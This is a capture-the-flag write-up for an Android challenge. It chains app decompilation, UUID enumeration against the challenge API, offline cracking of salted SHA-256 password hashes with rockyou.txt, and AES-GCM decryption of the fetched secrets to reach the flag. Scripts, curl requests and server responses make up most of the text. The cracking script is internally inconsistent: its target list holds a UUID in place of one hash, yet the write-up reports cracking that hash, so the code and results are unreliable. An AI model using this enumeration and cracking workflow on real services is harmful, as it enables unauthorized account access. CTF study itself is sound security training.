# Mobisec

After extracting the app code using **JADX-GUI** and running the app in the **Genymotion Emulator**, we noticed that the MainActivity of the app takes in an **IP Address** and **Port**. Upon entering the provided IP address and port from the challenge description, we created an instance.


When the "Connect" button is clicked, it triggers the **NotesActivity**, storing the IP and port information in **SharedPreferences.** The NotesActivity sends an API request that includes the **UUID** of our device.

## Issue Noticed

After entering a random password and hitting **login**, we intercepted an API request using **HTTP Toolkit**, but the response was empty. This led us to believe that the API request required a correct UUID.

```
curl http://35.198.191.122:31386/api/v1/acc/pass/ -H "X-MOBISEC:ef75826d9de13292593aa57f82a7763d" -H "Accept:application/json" -vv
```

## Script for UUID Checking 

We used the provided wordlist of UUIDs and successfully retrieved responses for three UUIDs.

```
import subprocess
base_url = "http://35.198.191.122:31386/api/v1/acc/pass/"
headers = [
    "X-MOBISEC: ef75826d9de13292593aa57f82a7763d",
    "Accept: application/json"
]

def send_request(uuid):
    url = base_url + uuid.strip()
    curl_command = ["curl", url, "-H", headers[0], "-H", headers[1], "-vv"]

    try:
        result = subprocess.run(curl_command, capture_output=True, text=True)
        print(f"Request to {url}:")
        print(result.stdout)
    except Exception as e:
        print(f"Error with UUID {uuid}: {e}")

with open("wordlist.txt", "r") as file:
    for line in file:
        send_request(line)
```

We used all the uuids from the provided wordlist and got response for three uuids : 

```
{'secret': {'hash': '77518b39e620ac271bfc58639796160cb3984af0a3e5f4367230ad768855e8e7'}} c8d8a726-a7c2-4b13-98a4-15f9c3831ef4

{'secret': {'hash': '87bcb0554d72bd277ae6c2795b8e09e03c56ed4314352449c3d371b70cdc1ea8'}} f79dd76f-2ce4-420f-bf46-f0ba82af04fb

{'secret': {'hash': 'e045171f3d3d93ee538b4673f7b5184bfd7d9eaa200f29f81ae1b7123a32ebca'}} 4d1713c1-ef9e-46b1-9fee-9ac57d4180b8
```

## Reversing the Hashes 

Next, we reverse-engineered the **"o" method** in the "a" class, responsible for button clicks, to identify the logic behind generating the hash. Here is the code from the **"o" method**:

```
public static String o(String str) {
        try {
            byte[] digest = MessageDigest.getInstance("SHA-256").digest(("LbhXabjVaCenpgvprFnygfNerHavdhrylTrarengrqSbeRirelCnffOhgVzGbbYnmlGbPbqrGung:)" + str).getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b3 : digest) {
                String hexString = Integer.toHexString(b3 & 255);
                if (hexString.length() == 1) {
                    sb.append('0');
                }
                sb.append(hexString);
            }
            return sb.toString();
        } catch (NoSuchAlgorithmException e3) {
            throw new RuntimeException(e3);
        }
    }
```

To reverse the hashes and retrieve the respective passwords, we implemented this Python script:

```
import hashlib

static_string = "LbhXabjVaCenpgvprFnygfNerHavdhrylTrarengrqSbeRirelCnffOhgVzGbbYnmlGbPbqrGung:)"
target_hashes = {
    "c8d8a726-a7c2-4b13-98a4-15f9c3831ef4",
    "87bcb0554d72bd277ae6c2795b8e09e03c56ed4314352449c3d371b70cdc1ea8",
    "e045171f3d3d93ee538b4673f7b5184bfd7d9eaa200f29f81ae1b7123a32ebca"
}

def hash_password(password):
    combined = static_string + password
    sha256_hash = hashlib.sha256(combined.encode()).hexdigest()
    return sha256_hash

def check_passwords(filename):
    with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            password = line.strip()
            hashed = hash_password(password)
            if hashed in target_hashes:
                print(f"Match found! Password: '{password}' | Hash: '{hashed}'")

check_passwords('rockyou.txt')
```

Running this script provided us with the following passwords:

```
killerpink007 e045171f3d3d93ee538b4673f7b5184bfd7d9eaa200f29f81ae1b7123a32ebca
SHALLOWgrounds13 87bcb0554d72bd277ae6c2795b8e09e03c56ed4314352449c3d371b70cdc1ea8
86390627 77518b39e620ac271bfc58639796160cb3984af0a3e5f4367230ad768855e8e7
```

On further investigation of source code we found out that there is an API request where the url is appended with what “o” method constructs . So we emulated those API requests using hashes of what “o” method would return on the matching passwords that we found out earlier again there were three responses by the API

The relevant requests and responses are here : 

```
curl http://34.107.90.184:30133/api/v1/sec/c8d8a726-a7c2-4b13-98a4-15f9c3831ef4 -H "X-MOBISEC:ef75826d9de13292593aa57f82a7763d" -H "Accept:application/json" -vv

*   Trying 34.107.90.184:30133...
* Connected to 34.107.90.184 (34.107.90.184) port 30133 (#0)
> GET /api/v1/sec/c8d8a726-a7c2-4b13-98a4-15f9c3831ef4 HTTP/1.1
> Host: 34.107.90.184:30133
> User-Agent: curl/7.81.0
> X-MOBISEC:ef75826d9de13292593aa57f82a7763d
> Accept:application/json
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: gunicorn
< Date: Sat, 28 Sep 2024 13:19:27 GMT
< Connection: close
< Content-Type: application/json
< Content-Length: 123
< 
{"secret":{"text":"0SlT+QWWG+6A3gxxUey87oIUHxmB2Hpex4cB2kDZz6ONVLCYHgJBuNgfIWceh0WF8VUGkUhOkDemH4XcSyYRFdtwXzHE6EkkEbGu"}}
* Closing connection 0

❯ curl http://34.107.90.184:30133/api/v1/sec/f79dd76f-2ce4-420f-bf46-f0ba82af04fb -H "X-MOBISEC:ef75826d9de13292593aa57f82a7763d" -H "Accept:application/json" -vv
*   Trying 34.107.90.184:30133...
* Connected to 34.107.90.184 (34.107.90.184) port 30133 (#0)
> GET /api/v1/sec/f79dd76f-2ce4-420f-bf46-f0ba82af04fb HTTP/1.1
> Host: 34.107.90.184:30133
> User-Agent: curl/7.81.0
> X-MOBISEC:ef75826d9de13292593aa57f82a7763d
> Accept:application/json
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: gunicorn
< Date: Sat, 28 Sep 2024 13:19:43 GMT
< Connection: close
< Content-Type: application/json
< Content-Length: 159
< 
{"secret":{"text":"xk9xj6E3f5pSHQjsmBOe2DoYegnOMyk1ej90DJrkBLKQjugbyaC0pG8Pb2xn5W//Q4fg/pt6nmj8wjlGkYAJGahbzwSoX+NGShZFivYLfkb4Zs7TY9HKs96p5KuzEY/GxUo67vg="}}
* Closing connection 0

❯ curl http://34.107.90.184:30133/api/v1/sec/4d1713c1-ef9e-46b1-9fee-9ac57d4180b8 -H "X-MOBISEC:ef75826d9de13292593aa57f82a7763d" -H "Accept:application/json" -vv
*   Trying 34.107.90.184:30133...
* Connected to 34.107.90.184 (34.107.90.184) port 30133 (#0)
> GET /api/v1/sec/4d1713c1-ef9e-46b1-9fee-9ac57d4180b8 HTTP/1.1
> Host: 34.107.90.184:30133
> User-Agent: curl/7.81.0
> X-MOBISEC:ef75826d9de13292593aa57f82a7763d
> Accept:application/json
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: gunicorn
< Date: Sat, 28 Sep 2024 13:20:02 GMT
< Connection: close
< Content-Type: application/json
< Content-Length: 91
< 
{"secret":{"text":"2mLZZaw/Wq6Ppo1E6uyDeRioC/RpLk2Hj+t0/+F+lFJyc3GnTwjeBqAHFIQS8q4lzFE="}}
* Closing connection 0
```
Inorder to decrypt them, the challenge description mentions how the encrypted text is split into nonce, tag, ciphertext = encrypted_data[:16], encrypted_data[16:32], encrypted_data[32:]

**On using the text and password pair, SHALLOWgrounds13 and xk9xj6E3f5pSHQjsmBOe2DoYegnOMyk1ej90DJrkBLKQjugbyaC0pG8Pb2xn5W//Q4fg/pt6nmj8wjlGkYAJGahbzwSoX+NGShZFivYLfkb4Zs7TY9HKs96p5KuzEY/GxUo67vg=, we get the flag**

```
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes
import hashlib
import base64

text_to_decode = "xk9xj6E3f5pSHQjsmBOe2DoYegnOMyk1ej90DJrkBLKQjugbyaC0pG8Pb2xn5W//Q4fg/pt6nmj8wjlGkYAJGahbzwSoX+NGShZFivYLfkb4Zs7TY9HKs96p5KuzEY/GxUo67vg="
def J(password, data):
    salt = b"0123456789abcdef"

    key = PBKDF2(password, salt, dkLen=32, count=100000)

    nonce = data[:16]
    ciphertext_and_tag = data[16:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    
    plaintext = cipher.decrypt_and_verify(ciphertext_and_tag[16:], ciphertext_and_tag[:16])
    
    return plaintext

password = b"SHALLOWgrounds13"

ciphertext = base64.b64decode(text_to_decode)
try:
    decrypted_data = J(password, ciphertext)
    print(decrypted_data)
except Exception as e:
    print(f"Decryption failed: {e}")
```

**The Flag - CTF{77cd55d22ef0d516a45ed0e238fbc5dbc4c93b0824047ea3e0a0509a5a9735ac}**






